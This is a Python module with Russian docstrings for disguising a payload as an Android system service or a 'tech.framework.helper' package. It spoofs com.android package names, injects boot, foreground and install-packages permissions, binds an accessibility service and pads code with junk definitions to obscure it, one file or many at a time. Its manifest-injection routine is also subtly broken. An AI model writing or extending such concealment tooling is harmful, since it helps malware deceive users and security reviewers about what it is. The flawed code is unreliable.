import logging
import random
import string
import re
from enum import Enum
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)


class MythicalName(Enum):
    """Мифологические названия для маскировки"""
    HERMES = "hermes"
    ATLAS = "atlas"
    TITAN = "titan"
    PROMETHEUS = "prometheus"
    ORACLE = "oracle"
    AEGIS = "aegis"
    HELIOS = "helios"
    KRONOS = "kronos"


class SystemServiceMask:
    """Маска системного сервиса Android"""

    SYSTEM_PACKAGES = [
        "com.android.providers.telephony",
        "com.android.providers.calendar",
        "com.android.providers.media",
        "com.android.systemui",
        "com.android.settings",
        "com.android.keychain",
        "com.android.packageinstaller",
        "com.google.android.gms",
        "com.google.android.gsf",
    ]

    SYSTEM_SERVICE_NAMES = [
        "AccessibilityService",
        "DeviceAdminReceiver",
        "NotificationListenerService",
        "PrintService",
        "WallpaperService",
        "InputMethodService",
        "VpnService",
        "JobService",
        "DreamService",
    ]

    def __init__(self, package_name: str = None, service_name: str = None):
        self.package_name = package_name or random.choice(self.SYSTEM_PACKAGES)
        self.service_name = service_name or random.choice(self.SYSTEM_SERVICE_NAMES)

    def get_masked_manifest_entry(self) -> str:
        return (
            f'<service android:name=".{self.service_name}" '
            f'android:exported="false" '
            f'android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"/>'
        )


class AndroidSystemMasker:
    """Маскировщик под системный процесс Android"""

    def __init__(self):
        self.logger = logging.getLogger(__name__)

    def mask_package_name(self, original: str) -> str:
        """Подменяет имя пакета на системное"""
        return f"com.android.{original.split('.')[-1].lower()}"

    def inject_system_permissions(self, manifest_content: str) -> str:
        """Добавляет системные разрешения в манифест"""
        system_perms = [
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.REQUEST_INSTALL_PACKAGES",
        ]
        perm_lines = "\n".join(
            f'    <uses-permission android:name="{p}"/>' for p in system_perms
        )
        return manifest_content.replace(
            "<manifest", f"<manifest>\n{perm_lines}\n<!--", 1
        ).replace("<manifest>", "<manifest", 1)

    def generate_system_service_code(self) -> str:
        """Генерирует Smali-код для маскировки под системный сервис"""
        return """
.class public Lcom/android/providers/core/SystemCoreService;
.super Landroid/app/Service;
.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    const/4 v0, 0x1
    return v0
.end method
"""


class TechFrameworkMasker:
    """Маскировщик под tech.framework.helper"""

    TECH_PACKAGES = [
        "tech.framework.helper",
        "com.system.core.service",
        "android.support.framework",
        "androidx.core.framework",
    ]

    def __init__(self):
        self.logger = logging.getLogger(__name__)

    def create_masked_package(
        self,
        code: str,
        include_service_init: bool = True,
        aggressive: bool = True,
    ) -> str:
        """
        Оборачивает код в маску системного фреймворка

        Args:
            code: Исходный код
            include_service_init: Добавить инициализацию сервиса
            aggressive: Агрессивный режим маскировки

        Returns:
            Код с маскировкой
        """
        header = f"""# Package: {random.choice(self.TECH_PACKAGES)}
# Framework: tech.framework.helper v{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}
# Build: {random.randint(10000, 99999)}
"""
        if include_service_init:
            init_code = """
# Service initialization stub
_service_initialized = False
_framework_version = "tech.framework.helper/2.1"

def _init_framework_service():
    global _service_initialized
    _service_initialized = True
    return True

_init_framework_service()
"""
            header += init_code

        if aggressive:
            # Добавляем мусорные определения для запутывания
            junk = self._generate_junk_definitions()
            return header + junk + "\n" + code
        else:
            return header + "\n" + code

    def _generate_junk_definitions(self) -> str:
        lines = []
        for i in range(random.randint(3, 6)):
            name = "_" + "".join(random.choices(string.ascii_lowercase, k=8))
            value = random.randint(0, 65535)
            lines.append(f"{name} = {value}")
        return "\n".join(lines) + "\n"


class NPMPackage:
    """Представляет NPM-пакет для маскировки"""

    def __init__(self, name: str, version: str = "1.0.0"):
        self.name = name
        self.version = version
        self.description = f"System package {name}"

    def to_dict(self) -> Dict:
        return {
            "name": self.name,
            "version": self.version,
            "description": self.description,
        }


class NPManager:
    """
    NPManager — менеджер маскировки пакетов
    Маскирует payload под системный сервис/библиотеку
    """

    def __init__(self, package_name: str = "tech.framework.helper"):
        self.package_name = package_name
        self.packages: List[NPMPackage] = []
        self.masker = TechFrameworkMasker()
        self.system_masker = AndroidSystemMasker()
        self.logger = logging.getLogger(__name__)
        self.logger.info(f"NPManager initialized (package={package_name})")

    def add_package(self, name: str, version: str = "1.0.0") -> NPMPackage:
        pkg = NPMPackage(name, version)
        self.packages.append(pkg)
        return pkg

    def mask_code(self, code: str, aggressive: bool = True) -> str:
        """Маскирует код под системный пакет"""
        return self.masker.create_masked_package(
            code,
            include_service_init=True,
            aggressive=aggressive,
        )

    def obfuscate_control_flow(self, code: str) -> str:
        """Запутывает поток управления"""
        prefix = f"""
# Control flow obfuscation — {self.package_name}
import sys as _sys_{random.randint(1000,9999)}
_cf_{random.randint(1000,9999)} = id
"""
        return prefix + code

    def get_package_list(self) -> List[Dict]:
        return [p.to_dict() for p in self.packages]


class NPManagerFactory:
    """Фабрика NPManager"""

    @staticmethod
    def create(package_name: str = "tech.framework.helper", **kwargs) -> "NPManager":
        return NPManager(package_name=package_name)

    @staticmethod
    def create_system(service_type: str = "core") -> "NPManager":
        package_name = f"com.android.{service_type}.framework"
        return NPManager(package_name=package_name)


class NPManagerBatchProcessor:
    """Пакетная обработка через NPManager"""

    def __init__(self, manager: NPManager = None):
        self.manager = manager or NPManager()
        self.logger = logging.getLogger(__name__)

    def process_files(self, file_paths: List[str], aggressive: bool = True) -> Dict[str, str]:
        """Обрабатывает список файлов"""
        results = {}
        for path in file_paths:
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    code = f.read()
                results[path] = self.manager.mask_code(code, aggressive=aggressive)
                self.logger.info(f"Обработан: {path}")
            except Exception as e:
                self.logger.error(f"Ошибка обработки {path}: {e}")
                results[path] = ""
        return results
